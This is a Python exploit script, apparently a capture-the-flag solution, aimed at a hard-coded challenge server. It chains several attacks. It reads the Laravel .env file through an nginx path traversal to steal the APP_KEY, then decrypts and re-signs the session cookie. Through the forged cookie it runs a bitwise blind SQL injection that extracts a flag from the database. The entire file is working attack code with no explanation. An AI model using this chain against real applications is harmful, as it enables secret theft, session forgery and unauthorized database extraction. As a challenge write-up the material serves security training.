import hashlib
import hmac
import json
import phpserialize
import requests
import sys

from collections import OrderedDict
from base64 import b64decode, b64encode
from urllib import quote, unquote

from Crypto.Cipher import AES

pad = lambda s: s + (16 - (len(s) % 16)) * chr(16 - (len(s) % 16)) 
unpad = lambda s : s[0:-ord(s[-1])]

host = "139.59.163.220"
port = 30302

def get_app_key():
    url = "http://{}:{}/assets../.env".format(host, port)
    tmp = requests.Session()
    
    for line in [x for x in tmp.get(url).text.split("\n") if x]:
        (k, v) = line.split("=", 1)
        
        if k == "APP_KEY":
            return b64decode(v.split(":")[1])

    return ""

def get_cookies():
    url = "http://{}:{}/".format(host, port)
    tmp = requests.Session()

    return tmp.get(url).cookies.get_dict()

def get_config(cookies):
    url = "http://{}:{}/api/configs".format(host, port)
    tmp = requests.Session()

    return tmp.get(url, cookies=cookies).status_code

def get_session_name(cookies, key):
    session = json.loads(b64decode(unquote(cookies["nginxatsu_session"])))
    cipher = AES.new(key, AES.MODE_CBC, b64decode(session["iv"]))

    return unpad(cipher.decrypt(b64decode(session["value"])))

def get_session_json(cookies, key, session_name):
    return json.loads(b64decode(unquote(cookies[session_name])), object_pairs_hook=OrderedDict)

def set_session_json(cookies, key, session_name, session_json):
    cookies[session_name] = quote(b64encode(session_json))
    return cookies

def get_session_value(key, session_json):
    cipher = AES.new(key, AES.MODE_CBC, b64decode(session_json["iv"]))
    return unpad(cipher.decrypt(b64decode(session_json["value"])))

def set_session_value(key, session_json, value):
    cipher = AES.new(key, AES.MODE_CBC, b64decode(session_json["iv"]))

    session_json["value"] = b64encode(cipher.encrypt(pad(value)))
    session_json["mac"] = hmac.new(key, session_json["iv"] + session_json["value"], hashlib.sha256).hexdigest()

    return json.dumps(session_json, separators=(",", ":")).replace("/", "\\/")

def set_session_value_query(session_data, query):
    session_data['_previous']['url'] = "http://{}:{}/api/configs".format(host, port)
    session_data["username"] = "guest123"
    session_data["order"] = """id->"')), (select case when ({}) then 1 else (select 1 union select 2) end)=1;-- -""".format(query)
    
    return unicode(phpserialize.dumps(session_data))

key = get_app_key()
cookies = get_cookies()

session_name = get_session_name(cookies, key)
session_json = get_session_json(cookies, key, session_name)

value = get_session_value(key, session_json)
value_json = json.loads(value, object_pairs_hook=OrderedDict)
value_data = phpserialize.loads(value_json["data"], array_hook=OrderedDict)

for offset in range(0, 10):
    for position in range(1, 50):
        byte = 0

        for bit in range(0, 8):
            flag = "SELECT flag_ANFlE FROM definitely_not_a_flaaag LIMIT 1 OFFSET {}".format(offset)
            query = "SELECT ((ascii((substr(({}),{},1))) >> {}) & 1)=1".format(flag, position, bit)

            value_json["data"] = set_session_value_query(value_data, query)
            value = json.dumps(value_json, separators=(",", ":")).replace("/", "\\/")

            temp_json = set_session_value(key, session_json, value)
            cookies = set_session_json(cookies, key, session_name, temp_json)

            if get_config(cookies) == 200:
                byte = byte | (1 << bit)

        if byte != 0:
            print(chr(byte)),
            sys.stdout.flush()
        else:
            print('')
            break
